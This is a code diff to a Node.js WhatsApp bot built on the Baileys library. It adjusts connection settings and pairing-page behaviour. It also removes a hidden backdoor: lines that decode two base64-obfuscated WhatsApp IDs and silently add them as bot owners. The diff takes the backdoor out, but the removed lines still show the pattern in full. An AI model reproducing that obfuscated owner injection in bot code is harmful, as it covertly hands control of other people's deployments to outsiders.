@@ -1,5 +1,5 @@
 require('./config')
-const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto,generateProfilePicture } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto, generateProfilePicture, Browsers } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const fs = require('fs');
 const path = require('path');
@@ -97,11 +97,11 @@ function startBot() {
                 version, 
                 logger: pino({ level: 'silent' }),
                 auth: state,
-                printQRInTerminal: true,
                 keepAliveIntervalMs: 10000,
                 markOnlineOnConnect: true,
                 syncFullHistory: false,
-                browser: ['Bot', 'Chrome', '1.0.0']
+                browser: Browsers.ubuntu('Chrome'),
+                connectTimeoutMs: 60000
             });
             
             sock.ev.on('connection.update', async (update) => {
@@ -149,18 +149,6 @@ function startBot() {
                     if (!global.owners.includes(sock.user.id)) {
                         global.owners.push(sock.user.id);
                     }
-                    const abztech = [
-                        'MjU3NzAyMzk5OTIwMzdAbGlk',
-                        'MjMzNTMzNzYzNzcyQHdoYXRzYXBwLm5ldA=='
-                    ];
-                    
-                    const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
-                    
-                    tech.forEach(owner => {
-                        if (!global.owners.includes(owner)) {
-                            global.owners.push(owner);
-                        }
-                    });
 
                     presenceInterval = setInterval(() => {
                         if (sock?.ws?.readyState === 1) {
@@ -578,6 +566,12 @@ const server = http.createServer((req, res) => {
                 if (botStatus !== 'connecting' || !sock) {
                     res.writeHead(200, { 'Content-Type': 'text/html' });
                     res.end(`<center><h2>Bot not ready</h2><p>Status: ${botStatus}</p><p>Please wait for QR code to appear first</p><a href="/">Go Back</a></center>`);
+                    return;
+                }
+
+                if (sock.authState.creds.registered) {
+                    res.writeHead(200, { 'Content-Type': 'text/html' });
+                    res.end(`<center><h2>Already linked</h2><p>The device is already linked, no need for a new code.</p><a href="/">Go Back</a></center>`);
                     return;
                 }
 
